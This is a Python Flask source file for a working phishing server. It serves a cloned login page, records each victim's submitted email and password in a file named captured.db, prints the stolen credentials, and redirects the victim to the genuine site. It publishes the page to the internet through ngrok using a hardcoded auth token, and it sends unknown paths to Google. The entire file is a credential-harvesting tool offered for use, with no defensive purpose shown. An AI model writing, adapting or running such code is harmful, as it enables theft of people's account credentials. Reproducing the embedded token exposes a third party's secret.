try:
   # importing Flask and other modules
   from flask import Flask, request, render_template , redirect
   import argparse
   from waitress import serve
   import os, time, socket, os.path
   from banner import *
   os.system('cls' if os.name == 'nt' else 'clear')
   PrintBanner()

   def is_connected():
      try:
         # connect to the host -- tells us if the host is actually
         # reachable
         socket.create_connection(("1.1.1.1", 53))
         return True
      except OSError:
         pass
      return False


   # Flask constructor
   app = Flask(__name__)   
   
   @app.errorhandler(404)
  
   # inbuilt function which takes error as parameter
   def not_found(e):
      return redirect('https://www.google.com')
   
   # A decorator used to tell the application
   # which URL is associated function
   @app.route('/', methods =["GET", "POST"])
   def submit():
      if request.method == "POST":
         # getting input with name = fname in HTML form
         email = request.form.get("email")
         # getting input with name = lname in HTML form 
         password = request.form.get("pass") 
         if os.path.exists("captured.db"):
            f = open("captured.db", "a")
            f.write(site.replace('https://www.','') + "|  ID : " + email + "  " + " |   Password: " + password + "\n-------------------------------------------------------------------------------------------------------\n")
            f.close()
         else:
            f = open("captured.db", "w")
            f.write(site.replace('https://www.','') + "|  ID : " + email + "  " + " |   Password: " + password + "\n-------------------------------------------------------------------------------------------------------\n")
            f.close()
         print(" [ * ] phished id:", email, "password:", password)   
         print(" [ + ] saved in captured.db")   
         return redirect(site)

      return render_template("index.html")


   def start_ngrok(port):
    from pyngrok import ngrok
    ngrok.set_auth_token("1yjVokuu5hZQOttJsRsitUzAtI1_6qaqFCMq6WWppniFa63pf")
    url = ngrok.connect(port,bind_tls=True).public_url
    print(' [ * ] Public address: ', url)

   if __name__=='__main__':
      parser = argparse.ArgumentParser()

      parser.add_argument("-p", "--port", default=4444, help = "Port number")

      args = parser.parse_args()
      
      PORT = args.port
      global site
      with open('./server/templates/index.html') as f:
               first_line = f.readline()
      site = first_line.replace('<!-- ','').replace(' -->','').replace('\n','')    

      app.debug = False
      print(' [ * ] Phishiing to:',site)
      print(' [ * ] Local address:', "http://"+socket.gethostbyname(socket.gethostname())+":"+PORT)
      ngrok = start_ngrok(PORT)
      serve(app, host='0.0.0.0', port=PORT, _quiet=True)

except KeyboardInterrupt:   
   pass   
